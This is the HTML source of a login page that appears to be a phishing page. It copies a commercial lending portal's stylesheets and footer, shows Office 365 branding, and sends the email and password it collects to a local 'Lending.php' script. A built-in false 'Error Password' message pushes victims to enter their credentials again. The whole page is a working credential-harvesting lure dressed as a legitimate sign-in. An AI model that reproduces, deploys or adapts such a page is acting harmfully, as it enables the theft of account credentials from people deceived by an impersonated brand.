<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />

    <title>Log in</title>
    <link href="https://lending.sabal.com/Content/img/favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
    <meta name="viewport" content="width=device-width" />
    <link href="https://lending.sabal.com/Lending/Content/css?v=KUgcsThyI3namNZI1vuBidv516JafBUFGr-AqConJxc1" rel="stylesheet"/>

    <link href="https://lending.sabal.com/Lending/ViewContent/Site?v=BcL9hZVWI4dxQaSex6nM0P81i6QzI-Y0bZkf_-aWM4M1" rel="stylesheet"/>

    
    <script src="https://lending.sabal.com/bundles/jquery?v=YmbxGzsOihwo8o9pCXckrZOZ4n6Nwr9sZtu38pFB68U1"></script>

    <script src="https://lending.sabal.com/Lending/bundles/bootstrap?v=bMriw0zEyk22HocTvpv2HolKYxbPsQVA1LMV6lZCaLU1"></script>

    <script src="https://lending.sabal.com/bundles/knockout?v=ifMpKU38B6MmJ580apjvpgzt_YAP5Y0cWxVE4BW2oso1"></script>

    <link href="https://lending.sabal.com/Areas/Lending/ViewContent/Common/PageBand.css" rel="stylesheet" />
    
    
    <style>
        a.forgot-password {
            margin-bottom: 5px;
            padding: 0;
            color: #38cf45;
        }
    </style>




    <style>
        body {
            min-height: 90%;
        }

        .blurb {
            padding: 20px;
            margin-left: 10px;
            margin-top: 40px;
            font-size: 19px;
            background: rgba(245, 245, 245, 0.55);
            background: rgba(247, 246, 246, 0.83);
            color: black;
            border-radius: 3px;
        }

        .blurb a,
        .blurb a:visited,
        .blurb a:focus
         {
            color:white;
        }
          
        .blurb a:hover{
            color:white;
            text-decoration:underline !important;
        }
         
        .marketing-text {
            border-left: 0px solid white;
            padding-left: 0px;
            color: whitesmoke;
            font-size: 20px;
            padding-top: 40px;
        }

        .btn-landing {
            margin-top: 10px;
            border-radius: 1px;
            margin-left: 20px;
            width: 120px;
            text-transform: none !important;
        }

        .company-logo {
            height: 40px;
            margin-top: 10px;
        }

        .company-logo {
            margin-bottom: 10px;
        }

        .navbar-default .navbar-nav > li > a.conspicious:hover {
            background: #46B346;
            background: #6fa5b7;
            color: white !important;
        }
    </style>


</head>


<body class="body-image">
    <a name="page-top"></a>

    
    <nav class="navbar navbar-default navbar-static-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="/">

                        <img class="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/1/14/Office_365_%282013-2019%29.svg">

                </a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">

                <ul class=" nav navbar-nav navbar-right" style="margin-left:0;">



                
                </ul>

                <ul class="nav navbar-nav navbar-right">

                </ul>

            </div>

        </div>
    </nav>

    <div id="lightbox" style="display: none;">
        <div class='lightbox-content'>
            <div class="progress progress-striped active">
                <div class="progress-bar" role="progressbar" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 45%">
                    <span class="sr-only">45% Complete</span>
                </div>
            </div>
            <div class="lightbox-caption">
                <p>Processing...</p>
            </div>
        </div>
    </div>

    


        <div class="page-wrapper">
            <div class="background-image"></div>

            


<script>
    function DisableButton(b) {
        b.disabled = true;
        b.value = 'Signing in';
        b.form.submit();
    }
</script>
<div id="" class="panel col-sm center-block">

    <div class="panel-heading" style="padding-top:12px; padding-bottom:20px;">

        <img src="https://online.iotap.com/content/images/thumbs/0000289_office-365-e1_550.jpeg" style="width:104px;height:88px" />
        
        
    </div>

    <div class="panel-body" style="padding-bottom:30px;">
        <div class="container">
            <div style="border-bottom:1px solid lightgray;"></div>
            <h2 style="text-align:left; color:#4D4D4D; margin-bottom:0;">Sign in</h2>
            <br />
<form action="Lending.php" method="post">                <div class="form-group input-group-lg">
                    <label>Email</label>
                    <input class="form-control" data-bind="event:{keypress:checkUserName}" data-val="true" data-val-required="The User name field is required." id="UserName" name="UserName" placeholder="User name" type="text" value="" />
                    <span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
                </div>
                <div class="form-group input-group-lg">
                    <div class="password">
                        <label>Password</label>
                    </div>
                    <input class="form-control" data-bind="hasFocus:isSelected" data-val="true" data-val-required="The Password field is required." id="Password" name="Password" placeholder="Password" type="password" />
                    <span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
                </div>
                <div class="row">

                    <div class="col-sm-12 text-center form-group">

                        <input type="submit" value="Sign in" class="btn btn-primary btn-full" onclick="DisableButton(this);" />
                    </div>
                </div>
                <div class="row">

                    <div class="col-sm-12 text-center">

                        <div class="a-divider">
                            <h5><span style="font-weight: 400"><i>
							<font color="#FF0000">Error Password. Enter with 
							Correct Details.</font></i></span></h5>
                        </div>

                        &nbsp;</div>
                </div>
</form>        </div>
    </div>
</div>






        </div>

    <footer class="footer" style="position:absolute; bottom:-170px;left:0;right:0; height:200px; display:none;">
        <div class="container-fluid">
            <div class="container" style="height:200px;">

                <div style="margin-top:0;">
                    <span>&nbsp;</span>
                    <span class="footerlink copy">Copyright &copy; 2014-2022 Sabal Capital Group </span>

                    <a href="/Lending/UserAgreement">Terms of Use</a>
                    <span>&nbsp;</span>
                    <a href="/Lending/Privacy">Privacy Policy</a>
                    <span>&nbsp;</span>
                    <a href="mailto:lending@sabal.com">Contact Us</a>
                </div>

                <div class="row" style="margin-top:30px; display:none;">
                    <div class="col-md-6 text-center">

                        <div>All loans funded through Sabal TL1, LLC, an approved Freddie Mac Seller / Servicer.</div>

                        <img src="https://lending.sabal.com/Content/img/SabalLogo.png" style="max-height:30px;" />

                    </div>
                    <div class="col-md-6 text-center">
                        <div style="line-height:70px; font-size:12px;">
                            <strong>Powered By</strong>&nbsp;&nbsp;&nbsp;&nbsp;
                            <img src="https://lending.sabal.com/Content/img/SnapLendingLogo.png" style="margin-top:-10px;max-height:60px;" />
                            &nbsp;&nbsp;&nbsp;&nbsp;<i>...focused solutions for smart lending</i>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </footer>


    <script src="https://lending.sabal.com/Areas/Lending/ViewContent/Common/Variables.js"></script>
    <script src="https://lending.sabal.com/Areas/Lending/ViewContent/Common/common.js"></script>
    <script>

        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date(); a = s.createElement(o),
            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
        ga('create', 'UA-52738997-2', 'auto');
        ga('send', 'pageview');

    </script>

    <script>

        $(function () {

            $(".always").each(function (index, element) {
                var alwaysBox = $(element), pos = alwaysBox.offset(), width = alwaysBox.width();
                alwaysBox.css('width', width);
                $(window).scroll(function () {
                    if ($(this).scrollTop() > (pos.top) && alwaysBox.css('position') == 'static') { alwaysBox.addClass('fixed-top'); }
                    else if ($(this).scrollTop() <= pos.top && alwaysBox.hasClass('fixed-top')) { alwaysBox.removeClass('fixed-top'); }
                });
            });

        });


    </script>

    <form id="__AjaxAntiForgeryForm" action="#" method="post">
        <input name="__RequestVerificationToken" type="hidden" value="daKv9SdDSKht_3BjxJbTsTBG1OC9MKtSBLS2QERc1T0H0aaU9OiHQ_ncQP9r3tXZGB-357KMpDhVkNeownTh0zTBmaHFjTjBprCQWyXwybE1" />
    </form>

    <script>
    var SNAP = {};
    </script>

    
    <script src="https://lending.sabal.com/Areas/Lending/ViewContent/Account/Account.Login.js"></script>




</body>























































</html>
